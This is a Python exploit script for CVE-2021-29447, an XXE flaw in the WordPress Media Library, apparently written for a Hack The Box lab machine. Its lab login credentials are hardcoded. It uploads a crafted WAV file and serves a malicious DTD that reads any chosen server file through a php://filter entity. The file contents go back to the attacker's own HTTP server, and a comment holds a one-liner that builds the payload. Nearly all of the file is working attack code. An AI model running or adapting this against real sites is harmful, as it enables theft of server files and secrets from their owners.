#!/usr/bin/env python3

"""
Author: poorduck
Description: in wordpress version 5.6.0 to 5.7.0 where an an authenticated user with the ability to upload files
             in the "Media Library" can upload a malicious WAVE file that could lead to remote arbitrary file disclosure
             and server-side request forgery (SSRF).
CVE: CVE-2021-29447 https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/

Usage: python3 script.py [FILENAME]
                        where FILENAME is the full path of file want to read.
"""

import requests
from bs4 import BeautifulSoup
from re import findall
import threading
import socketserver
import http.server
from base64 import b64decode
import netifaces as ni
from os import path
from sys import argv

try:
    tun0_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
except ValueError as e:
    print("[!] tun0 not found!")
    exit(e)

session = requests.Session()
# session.proxies = {"http": "http://127.0.0.1:8080"}

host = 'http://metapress.htb'
username = 'manager'
password = 'partylikearockstar'

# Login to wordpress and get auth session
def login_to_wordpress(login_url, username, password):

    # get the login page to extract the login form fields
    login_page = session.get(login_url)
    soup = BeautifulSoup(login_page.content, 'html.parser')
    form = soup.find('form', {'id': 'loginform'})

    # extract the form fields
    action = form['action']
    inputs = form.find_all('input')
    data = {}
    for i in inputs:
        if i.has_attr('name'):
            data[i['name']] = i['value']

    # update the form fields with the credentials
    data['log'] = username
    data['pwd'] = password

    # submit the form
    response = session.post(action, data=data, allow_redirects=False)

    # check if the login was successful
    if "wordpress_logged_in" in response.headers["Set-Cookie"]:
        print('[+] Login successful!')
        return True
    else:
        print('[-] Login failed.')
        return False

# File upload function in wordpress "Media Library" 
def wp_media_library_upload(upload_url, username, password, filename):

    # log in to WordPress
    login_success = login_to_wordpress(login_url=f"{host}/wp-login.php", username=username, password=password)
    if not login_success:
        print("[-] Login failed.")
        return False

    # prepare the image data
    with open(filename, 'rb') as f:
        image_data = f.read()

    # Grab _wpnonce
    res = session.get(f"{host}/wp-admin/media-new.php")
    wp_nonce = findall(r'name="_wpnonce" value="(\w+)"',res.text)
    if len(wp_nonce) == 0 :
        print("[-] Failed to retrieve the _wpnonce")
        return False
    else :
        _wpnonce = wp_nonce[0]
        print("[+] Wp Nonce retrieved successfully ! _wpnonce : " + _wpnonce)

    file_data = {"name": (None, filename), "action": (None, "upload-attachment"), "_wpnonce": (None, _wpnonce), "async-upload": (filename, image_data)}

    # send the POST request to upload the image
    response = session.post(upload_url, files=file_data)

    # check if the image was uploaded successfully
    if 'success' in response.text:
        print('[+] Image uploaded successfully!')
        return True
    elif response.status_code == '502':
        return True  # XXE triggered.
    else:
        print('[-] Image upload failed.')
        return False 

# http server handler
class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    already_processed = set() # Add this line to define the attribute

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory='.', **kwargs)

    def do_GET(self):
        # Check if the request has already been processed
        if self.path in self.already_processed:
            return
        self.already_processed.add(self.path)

        super().do_GET()

        # extract the request path from the log and print it
        request_path = self.requestline
        if "?p=" in request_path:
            recv_data = request_path.split(' ')[1]
            recv_data = findall(r"/\?p=(.*?)$", recv_data)[0]
            base64_decoded = b64decode(recv_data).decode('UTF-8')
            print('[+] Data received:\n'+ base64_decoded)

    def log_message(self, format, *args):
        pass

# http server
def run_http_server(port, stop_event):
    try:
        server = socketserver.TCPServer(("", port), MyHttpRequestHandler)
        print("[+] HTTP server started at port", port)
        while not stop_event.is_set():
            try:
                server.serve_forever()
            except KeyboardInterrupt:
                break
            # except ThreadError:
            #     break
        server.server_close()
    except OSError as e:
        print(e)
    except Exception as e:
        print(e)

# Generate required files for the exploit
def init_files(get_this_file):
    dtd = f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={get_this_file}">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://{tun0_ip}:8000/?p=%file;'>" >"""
    fn1 = 'NAMEEVIL.dtd'
    with open(fn1, 'w') as f:
        f.write(dtd)
        print(f'[+] File {fn1} written successfully.')

    fn2 = 'payload.wav'
    if not path.isfile(fn2):
        print(f'[!] File {fn2} Not Found!')
        exit(0)

        # Create "payload.wav" manually
        """
        echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.32:8000/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
        """
        # I don't find any way to create working wav file using python.


if __name__ == '__main__':
    try:
        init_files(get_this_file=argv[1])

        # start the HTTP server in a separate thread
        stop_event = threading.Event()
        server_thread = threading.Thread(target=run_http_server, args=(8000, stop_event))
        server_thread.daemon = True
        server_thread.start()

        # upload the image to WordPress
        success = wp_media_library_upload(upload_url=f"{host}/wp-admin/async-upload.php", username=username, password=password, filename="payload.wav")

        # wait for the flag to be set and close the HTTP server
        if success or not success:
            stop_event.set()
            server_thread.join(timeout=5.0)  # Threading is not implemented correctly(?), Or there something else. Because after script exit, running it again immediately cause OSError.
    except IndexError as e:
        print(f"Usage: {argv[0]} <filename>")
    except Exception as e:
        print(e)
